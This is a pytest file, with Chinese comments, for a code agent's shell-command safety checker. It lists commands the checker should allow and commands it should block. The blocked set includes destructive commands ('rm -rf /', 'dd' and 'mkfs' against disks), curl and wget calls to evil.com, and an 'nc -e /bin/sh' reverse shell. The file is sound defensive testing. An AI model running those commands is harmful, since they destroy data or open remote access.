"""测试安全检查逻辑 — bash 命令白名单/黑名单"""
import pytest
from code_agent.tools.shell_tools import check_safety


class TestCheckSafety:
    """check_safety 纯函数测试"""

    # ── 白名单通过 ──
    @pytest.mark.parametrize("cmd", [
        "git status",
        "git diff --stat",
        "python main.py",
        "pytest tests/ -v",
        "pip install pandas",
        "npm install",
        "node server.js",
        "ls -la",
        "cat README.md",
        "echo hello",
        "grep pattern file.py",
        "rg --line-number pattern .",
        "find . -name '*.py'",
        "wc -l file.txt",
        "head -n 10 file.txt",
        "tail -n 10 file.txt",
        "sort file.txt",
        "uniq file.txt",
    ])
    def test_allowed_commands_pass(self, cmd):
        safe, reason = check_safety(cmd)
        assert safe, f"命令 '{cmd}' 应该通过，但被拒绝: {reason}"

    # ── 黑名单拦截 ──
    @pytest.mark.parametrize("cmd,keyword", [
        ("rm -rf /", "rm -rf /"),
        ("sudo rm file", "sudo "),
        ("chmod 777 file", "chmod 777"),
        ("echo > /dev/sda", "> /dev/"),
        ("mkfs.ext4 /dev/sda1", "mkfs."),
        ("dd if=/dev/zero of=/dev/sda", "dd if="),
    ])
    def test_blocked_commands_rejected(self, cmd, keyword):
        safe, reason = check_safety(cmd)
        assert not safe, f"命令 '{cmd}' 应被拦截"
        assert keyword in reason

    # ── 不在白名单 ──
    @pytest.mark.parametrize("cmd", [
        "curl http://evil.com",
        "wget http://evil.com",
        "nc -e /bin/sh localhost 9999",
        "./malicious_script.sh",
        "/bin/bash",
        "shutdown -h now",
    ])
    def test_unknown_prefix_rejected(self, cmd):
        safe, reason = check_safety(cmd)
        assert not safe, f"命令 '{cmd}' 应被拒绝"
        assert "不在白名单" in reason

    # ── 空命令 ──
    def test_empty_command_rejected(self):
        safe, reason = check_safety("")
        assert not safe
        assert "空命令" in reason

    def test_whitespace_only_rejected(self):
        safe, reason = check_safety("   ")
        assert not safe
        assert "空命令" in reason

    # ── 自定义规则注入 ──
    def test_custom_blocked_keywords(self):
        custom_blocked = ["format C:"]
        safe, reason = check_safety("format C: /q", blocked_keywords=custom_blocked)
        assert not safe
        assert "format C:" in reason

    def test_custom_allowed_prefixes(self):
        custom_allowed = ["docker "]
        safe, _ = check_safety("docker ps", allowed_prefixes=custom_allowed)
        assert safe

    def test_custom_prefix_not_allowing_other(self):
        custom_allowed = ["docker "]
        safe, reason = check_safety("kubectl get pods", allowed_prefixes=custom_allowed)
        assert not safe
